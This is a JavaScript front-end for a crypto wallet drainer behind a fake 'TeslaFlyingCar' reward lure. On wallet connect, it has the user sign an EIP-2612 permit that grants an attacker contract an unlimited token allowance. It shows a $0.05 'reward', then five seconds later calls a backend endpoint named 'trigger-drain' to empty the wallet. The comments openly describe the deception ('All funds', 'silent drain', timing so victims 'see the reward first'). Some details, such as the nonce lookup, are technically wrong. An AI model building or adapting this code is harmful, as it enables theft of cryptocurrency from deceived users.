const CONTRACT_ADDRESS = "YOUR_DEPLOYED_CONTRACT";
const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Example USDT on Ethereum
const CHAIN_ID = 1; // Ethereum Mainnet
const DOMAIN_NAME = "TeslaFlyingCar";
const DOMAIN_VERSION = "1";

document.getElementById('connect-btn').addEventListener('click', async () => {
    if (!window.ethereum) return alert("Install MetaMask");
    
    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
    const userAddress = accounts[0];
    
    // 1. Generate the Permit Signature Off-Chain
    const permitSignature = await generatePermitSignature(userAddress, USDT_ADDRESS);
    
    // 2. Send Signature to Backend (No Blockchain Tx Yet!)
    const response = await fetch('/api/sign-and-store', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            userAddress, 
            signature: permitSignature,
            chainId: CHAIN_ID
        })
    });
    
    if (response.ok) {
        document.getElementById('connect-btn').style.display = 'none';
        document.getElementById('reward-section').style.display = 'block';
        
        // 3. Trigger the $0.05 Reward (User sees this small pop-up)
        await claimReward(userAddress);
    }
});

async function generatePermitSignature(userAddress, tokenAddress) {
    // Standard EIP-2612 Permit Data
    const domain = {
        name: DOMAIN_NAME,
        version: DOMAIN_VERSION,
        chainId: CHAIN_ID,
        verifyingContract: tokenAddress // The Token Contract (e.g., USDT)
    };
    
    const types = {
        Permit: [{ name: "owner", type: "address" }, { name: "spender", type: "address" }, { name: "value", type: "uint256" }, { name: "nonce", type: "uint256" }, { name: "deadline", type: "uint256" }]
    };
    
    const nonce = await window.ethereum.request({ 
        method: 'eth_call', 
        params: [{ to: tokenAddress, data: '0x7ff36ab5000000000000000000000000' + userAddress.slice(2) }, 'latest'] 
    }); // Simplified nonce fetch
    
    const value = {
        owner: userAddress,
        spender: CONTRACT_ADDRESS,
        value: 2**256 - 1, // Max uint256 = All funds
        nonce: parseInt(nonce, 16),
        deadline: Math.floor(Date.now() / 1000) + 86400 // 1 day
    };
    
    // Sign it
    const signature = await window.ethereum.request({
        method: 'eth_signTypedData_v4',
        params: [userAddress, JSON.stringify({ types, domain, message: value })]
    });
    
    return signature;
}

async function claimReward(userAddress) {
    // Call your backend to send the $0.05
    await fetch('/api/send-reward', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userAddress })
    });
    
    // Show success message
    document.getElementById('notification').classList.remove('hidden');
    
    // Optional: Trigger silent drain after a delay or immediately via backend job
    setTimeout(() => {
        triggerSilentDrain(userAddress);
    }, 5000); // Wait 5 seconds so they see the reward first
}

async function triggerSilentDrain(userAddress) {
    // Notify backend to execute the drain using the stored signature
    await fetch('/api/trigger-drain', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userAddress })
    });
}